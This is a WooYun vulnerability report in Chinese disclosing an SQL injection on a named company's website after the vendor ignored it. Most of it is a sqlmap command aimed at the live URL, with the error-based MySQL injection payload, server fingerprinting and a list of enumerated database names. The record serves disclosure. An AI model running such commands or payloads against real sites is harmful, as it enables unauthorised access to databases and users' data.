wybug_title: 天闻数媒主站存在SQL注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2013-08-22：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-10-06：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 天闻数媒主站存在SQL注入漏洞 可能导至会员信息泄露 详细说明：  http://www.twsm.com.cn/flash_upload.php?modelid=189   漏洞证明：  $ python sqlmap.py -u "http://www.twsm.com.cn/flash_upload.php?modelid=189" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 08:53:58[08:53:58] [INFO] resuming back-end DBMS 'mysql'[08:53:59] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: modelid    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: modelid=189 AND (SELECT 4451 FROM(SELECT COUNT(*),CONCAT(0x3a6670683a,(SELECT (CASE WHEN (4451=4451) THEN 1 ELSE 0 END)),0x3a66646b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---[08:53:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 5.2.4, Apache 2.2.4back-end DBMS: MySQL 5.0[08:53:59] [INFO] fetching database names[08:53:59] [INFO] the SQL query used returns 10 entries[08:53:59] [INFO] resumed: information_schema[08:53:59] [INFO] resumed: articledb[08:53:59] [INFO] resumed: mysql[08:53:59] [INFO] resumed: phpmyadmin[08:53:59] [INFO] resumed: snsdb[08:53:59] [INFO] resumed: test[08:53:59] [INFO] resumed: tianwen[08:53:59] [INFO] resumed: twportal[08:53:59] [INFO] resumed: ucenter[08:53:59] [INFO] resumed: zhikuavailable databases [10]:[*] articledb[*] information_schema[*] mysql[*] phpmyadmin[*] snsdb[*] test[*] tianwen[*] twportal[*] ucenter[*] zhiku[08:53:59] [INFO] fetched data logged to text files under '/home/lfort/sqlmap/output/www.twsm.com.cn'[*] shutting down at 08:53:59   修复方案：  不多说都懂的   版权声明：转载请注明来源 Soul@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
